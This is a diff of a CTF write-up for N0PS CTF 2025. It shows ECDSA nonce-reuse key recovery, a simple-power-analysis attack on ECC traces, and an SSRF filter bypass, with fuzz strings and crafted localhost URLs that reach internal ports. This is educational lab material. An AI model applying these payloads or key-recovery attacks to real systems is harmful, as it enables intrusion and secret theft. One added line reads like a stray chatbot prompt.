@@ -6,48 +6,46 @@ summary: "A comprehensive write-up of the N0PS CTF 2025 by Team NOVA, sharing in
 tags: ["N0PS", "CTF", "Web", "Crypto", "Reversing", "Forensics", "Pwn", "OSINT"]
 authors: ["Spideyy"]
 status: draft
-createdAt: "2025-11-29T12:48:20.086Z"
-updatedAt: "2025-11-29T12:48:20.086Z"
+createdAt: "2025-11-29T12:49:46.770Z"
+updatedAt: "2025-11-29T12:49:46.770Z"
 ---
 
-
-````md
+give the whole content broooo:
 ## CrypTopia
 
 ### Free n00psy
 
-**Description :** I found data left by n00psy who was analysing a security lock before getting captured. Noopsy might have been able to glitch its RNG. This [document](https://web.archive.org/web/20250505090133/https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf) was also laying around.
+**Description :**  I found data left by n00psy who was analysing a security lock before getting captured. Noopsy might have been able to glitch its RNG. This [document](https://web.archive.org/web/20250505090133/https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf) was also laying around.
 Can you help me recover the secret to clone a security badge and open the secure door to free n00psy.
 
 **Hint 1** : The comms are repeating a single operation over and over again...
 
-**Hint 2** : Some curves are quite known, aren’t they?
+**Hint 2** :  Some curves are quite known, aren’t they?
 
-**Files** : `SignatureLog.txt` , `Secret.zip`
+**Files**  : `SignatureLog.txt` , `Secret.zip`
 
 #### First Look
-
-The `Secret.zip` seems to be encrypted having 2 files
-
+the `Secret.zip` seems to be encrypted having 2 files
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419275892-image.png)
 
-Let’s try to crack it with `rockyou.txt`
+lets try to crack it with `rockyou.txt`
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419344416-image.png)
 
-No luck there, next we check if it's a classic zip.
+
+no luck there, next we check if its a classic zip
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419376521-image.png)
 
-It is encrypted with ZipCrypto but the compression is Deflate, so a known plaintext won’t work with these files ;-;
+
+it is encrypted with ZipCrypto but the compression is Deflate, so a known plaintext wont work with these files ;-;
 
 #### Changing Focus
-
-Since we didn't get anywhere with `Secret.zip`, let’s focus on `SignatureLog.txt`.
+Since we didn't get anywhere with `Secret.zip`, lets focus on `SignatureLog.txt`
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419405429-image.png)
 
-These seem to be [ECDSA](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) signatures of `Approve access for ID <id>` , let’s parse them in Python and analyze them:
+these seems to be [ECDSA](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) Signatures of `Approve access for ID <id>` , lets parse them in python and analyze them
 
 ```python
 raw = open("SignatureLog.txt").readlines()
@@ -63,11 +61,13 @@ for (id,r,s) in data:
         if id!=d2[0] and r!=d2[1]:
             print(id,d2[0])
             break
-````
+```
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419427578-image.png)
 
-Bamm, the `SignatureLog.txt` contains multiple signatures with same `r` meaning `nonce (k)` is reused. We can use this for a [nonce reuse attack](https://billatnapier.medium.com/ecdsa-signatures-are-great-but-be-carefull-of-nonce-reuse-eeba25d20ab7).
+
+
+bamm , the `SignatureLog.txt` contains multiple signature with same `r` meaning `nonce (k)` is reused , we can use this for [nonce reuse attack](https://billatnapier.medium.com/ecdsa-signatures-are-great-but-be-carefull-of-nonce-reuse-eeba25d20ab7)
 
 ```python
 import os
@@ -109,31 +109,29 @@ s2 = int("43e149561f9246162d275e6a7354d53a9ce23a727c965a5fdc61c983df53bc4", 16)
 key = list(attack(n, m1, r, s1, m2, r, s2))
 print(long_to_bytes(key[0][1]))
 ```
-
-[Attack from jvdsn/crypto-attacks](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/ecc/ecdsa_nonce_reuse.py)
+[attack from jvdsn/crypto-attacks](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/ecc/ecdsa_nonce_reuse.py)
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419453493-image.png)
 
-`next.txt:`
 
+`next.txt:`
 `Yay! We made it past the first step to rescue Noopsy. 
 Wasn't that a good sign? But now we go to the next task when we have the time! 
 The comms seem stuck with one single operation now. 
 Some things add up and some don't! Remember, patience is key for rescuing Noopsy!`
 
-Loading up the `traces_ECC.npy` in numpy we see it has shape `(20, 16551)`:
-
+loading up the `traces_ECC.npy` in numpy we see it has shape `(20, 16551)`
 ```python
 import numpy as np
 traces = np.load("traces_ECC.npy",allow_pickle=True)
 print(traces.shape)
 ```
 
-Given the context, this is going to be a [side-channel attack](https://en.wikipedia.org/wiki/Side-channel_attack), specifically from the `next.txt` : `The comms seem stuck with one single operation now` and `Some things add up and some don't!`, we can infer all 20 traces of 16551 samples are of same operation and we need to identify patterns for double-add and double-only operation. Without any additional metadata it is more likely to just require an `SPA (Simple Power Analysis)` attack.
+given the context , this is going to be a [side-channel attack](https://en.wikipedia.org/wiki/Side-channel_attack) , specifically from the `next.txt`  : `The comms seem stuck with one single operation now` and `Some things add up and some don't!` , we can infer all 20 traces of 16551 samples  are of same operation and we need to identify patterns for double-add and double-only operation , without any additional metadata it it more likely to just require `SPA (Simple Power Analysis)` attack.
 
-Basically in SPA we determine visual patterns in the power traces to differentiate double-add and double-only operations, using that we can map double-add to a **1 bit** and double-only to a **0 bit** of the **private key** used.
+basically in SPA we determine visual patterns in the power traces to differentiate double-add and double-only operations ,using that we can map double-add to a **1 bit** and double-only to a **0 bit** of the **private key** used
 
-We can take the mean of the traces because, based on `Hint 1` and `next.txt`, we know that all traces correspond to the same operation (like signing the same message). This implies that the internal computation is identical, allowing us to average the traces to reduce noise and highlight consistent leakage patterns.
+We can take the mean of the traces because, based on `Hint 1` and `next.txt`, we know that all traces correspond to the same operation (like signing the same message), This implies that the internal computation is identical, allowing us to average the traces to reduce noise and highlight consistent leakage patterns
 
 ```python
 import numpy as np
@@ -151,22 +149,22 @@ plt.grid(True)
 plt.subplots_adjust(top=0.7, bottom=0.4,left=0,right=1)
 plt.show()
 ```
-
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419479063-image.png)
 
-Let’s zoom in a little:
+
+lets Zoom in a little
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419499421-image.png)
 
-Researching online for side-channel SPA attack on ECC, we come across readings about how double-add and double-only operations differ in power traces, one such example trace is:
+researching only for side-channel SPA attack on ECC , we come across readings about how double-add and double-only operations different in power traces , one such example trace is 
 
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419529099-image.png)
 
-Comparing it to our traces plot, we can clearly see a pattern of shorter gaps between peaks (double-only) and longer gaps (double-add):
 
+comparing it to our traces plot , we can clearing see a pattern of shorter gaps between peeks (double-only) and longer gaps (double-add)
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419567981-image.png)
 
-Now to determine the operations programmatically, we can look at the length of gaps between the power peaks: smaller gap = double-only = 0 and bigger gap = double-add = 1. A little help from GPT goes a long way :D
+Now to determine the operations programmatically , we can look at the length of gaps between the power peaks, smaller gap = double-only = 0  and bigger gap = double-add = 1 , a little help from gpt goes a long way :D
 
 ```python
 import numpy as np
@@ -200,9 +198,7 @@ for d in desc:
     if j < len(asc):
         gaps.append(asc[j] - d)
 ```
-
-Plotting for debugging and parameters adjustment:
-
+Plotting for debugging and parameters adjustment
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419624947-image.png)
 
 ```python
@@ -225,8 +221,8 @@ plt.tight_layout()
 plt.show()
 ```
 
-After some changing parameters and visually confirming all peaks and gaps are detected carefully, we interpret the gaps as bits for the private key:
-
+after some changing parameters and visually confirming all peaks and gaps are detected carefully
+we interpret the gaps as bits for the private key 
 ```python
 gaps = np.array(gaps)
 bits= (gaps > 30).astype(int)
@@ -241,22 +237,20 @@ print("Decoded : ",long_to_bytes(num))
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419677718-image.png)
 
 Well that doesn't look right ;-;
-After checking the binary output a bit, we see that the bits are correct but it is reversed so we reverse the binary output before decryption:
-
+after checking the binary output a bit , we see that the bits are correct but it is revered so
+we reversing the binary output before decryption we get
 ```python
 bits = "".join(str(b) for b in bits)[::-1]
 ```
-
 ![image](/static/images/n0ps-ctf-2025-writeup/1764419703627-image.png)
 
-Almost there!!! Well, analysing the binary output manually in [CyberChef](https://gchq.github.io/CyberChef/), we find there has been an extra 0 bit in the middle of the binary output, probably because our `max_spike_width` param was too low and a peak with spiked was interpreted as another gap and 1 bit and a 0 bit was missing at the start and the end (should really improve the script but hey if it works it works!!!!)
-Anyway fixing the binary string we get our final flag:
 
-```text
+Almost there!!! , well analysing the binary output manually in [CyberChef](https://gchq.github.io/CyberChef/) ,we find there has been a extra 0 bit  in the middle of the binary output , probably because our `max_spike_width` param was too low and a peak with spiked was interpreted as another gap and 1 bit and a 0 bit was missing at the start and the end, (should really improve the script but hey if it works it works!!!!)
+Anyway fixing the binary string we get our final flag 
+```
 Binary : 0100111000110000010100000101001101111011010001100011000001010010010111110100101001010101010100110101010001011111001101000101111101010011001100010100110101010000010011000011001101011111001100110101100001000011010010000011010001001110010001110011001101111101
 ```
-
-```text
+```
 FLAG : `N0PS{F0R_JUST_4_S1MPL3_3XCH4NG3}`
 ```
 
@@ -266,7 +260,7 @@ FLAG : `N0PS{F0R_JUST_4_S1MPL3_3XCH4NG3}`
 
 ## WebTopia
 
-### Blog - That Blogged Too Hard
+###  Blog - That Blogged Too Hard
 
 I landed on this simple-looking blog site — nothing too fancy, just three posts with titles like:
 
@@ -287,7 +281,7 @@ But I'm in a CTF, so naturally, I tried to break it.
 
 ---
 
-#### JavaScript Spoils the Mystery
+####  JavaScript Spoils the Mystery
 
 The frontend made it *way too easy* to see how things worked:
 
@@ -295,9 +289,9 @@ The frontend made it *way too easy* to see how things worked:
 fetch('/blog.php?blog=all')
 ```
 
-Clicking one sends:
+&#x20;Clicking one sends:
 
-```text
+```
 /blog.php?blog=1
 ```
 
@@ -305,11 +299,11 @@ Clearly, some PHP backend is fetching blog data using that `blog` parameter. Tim
 
 ---
 
-#### Fuzzin’ and Breakin’
+####  Fuzzin’ and Breakin’
 
 Sent in some spicy nonsense:
 
-```text
+```
 /blog.php?blog='"`{ ;$Foo}
 ```
 
@@ -334,7 +328,7 @@ This smells like **SSRF**.
 
 Tried a NoSQL-style input:
 
-```text
+```
 /blog.php?blog[$ne]=null
 ```
 
@@ -344,7 +338,7 @@ Got this gem:
 str_starts_with(): Argument #1 ($haystack) must be of type string, array given
 ```
 
-Aha! It may be doing:
+Aha! It May be doing:
 
 ```php
 if (str_starts_with($blog, "http://"))
@@ -360,13 +354,13 @@ Boom. We’re in SSRF town.
 
 Tried:
 
-```text
+```
 /blog.php?blog=http://localhost/
 ```
 
 And got hit with:
 
-```text
+```
 Warning: Request should only be sent to backend host.
 ```
 
@@ -378,24 +372,20 @@ if (!str_contains($url, 'backend')) {
 }
 ```
 
-Tried:
-
-```text
-/blog.php?blog=http://backend/
-```
+####  `/blog.php?blog=http://backend/`?
 
 * No errors.
 * But also **no output**.
 
 Then I tried:
 
-```text
+```
 /blog.php?blog=http://backend/1
 ```
 
 It returned the same content as:
 
-```text
+```
 /blog.php?blog=1
 ```
 
@@ -403,25 +393,25 @@ So the backend itself is mirroring the same data. Kinda boring, but useful confi
 
 ---
 
-#### Now the Clever Bit: The Bypass
+#### Now the Clever Bit: The \`\`\*\* Bypass\*\*
 
 Tried:
 
-```text
+```
 /blog.php?blog=http://backend@127.0.0.1/
 ```
 
-* No warning!
-* SSRF request went through.
-* Redirected to index page… something’s working…
+ No warning!
+ SSRF request went through.
+ Redirected to index page… something’s working…
 
 ---
 
-#### Why Does `http://backend@127.0.0.1/` Work?
+####  Why Does `http://backend@127.0.0.1/` Work?
 
 This is an old SSRF trick using **Basic Auth syntax** in URLs:
 
-```text
+```plaintext
 http://[username]@[host]/path
 ```
 
@@ -430,12 +420,13 @@ So `http://backend@127.0.0.1:8080/` is interpreted by the browser or curl (and P
 * `backend` = username
 * `127.0.0.1:8080` = actual host
 
-The username is ignored by the server if there's no password challenge.
+**The username is ignored** by the server if there's no password challenge.
 
-* The filter sees `"backend"` in the string, so it passes
-* But the actual request goes to `127.0.0.1:8080`
+✔ The filter sees `"backend"` in the string, so it passes
 
-Classic SSRF bypass.
+✔ But the actual request goes to `127.0.0.1:8080`
+
+Classic SSRF bypass. You love to see it.
 
 ---
 
@@ -443,7 +434,7 @@ Classic SSRF bypass.
 
 I hit all the classics:
 
-```text
+```
 /blog.php?blog=http://backend@127.0.0.1:5000/
 /blog.php?blog=http://backend@127.0.0.1:8000/
 /blog.php?blog=http://backend@127.0.0.1:1337/
@@ -451,7 +442,7 @@ I hit all the classics:
 
 Then:
 
-```text
+```
 /blog.php?blog=http://backend@127.0.0.1:8080/
 ```
 
@@ -459,7 +450,7 @@ Then:
 
 And staring back at me was:
 
-```text
+```
 N0PS{S5rF_1s_Th3_n3W_W4y}
 ```
 
@@ -478,9 +469,8 @@ N0PS{S5rF_1s_Th3_n3W_W4y}
   * `/blog.php?blog=http://backend/` → no output
   * `/blog.php?blog=http://backend/1` → same blog content as `/blog.php?blog=1`
 * Bypassed filter with `http://backend@127.0.0.1:8080/`
-* Port 8080 had the flag `N0PS{S5rF_1s_Th3_n3W_W4y}`
+* Port 8080 had the flag \`N0PS{S5rF\_1s\_Th3\_n3W\_W4y}\`
 
-```
+---
 
-```
 
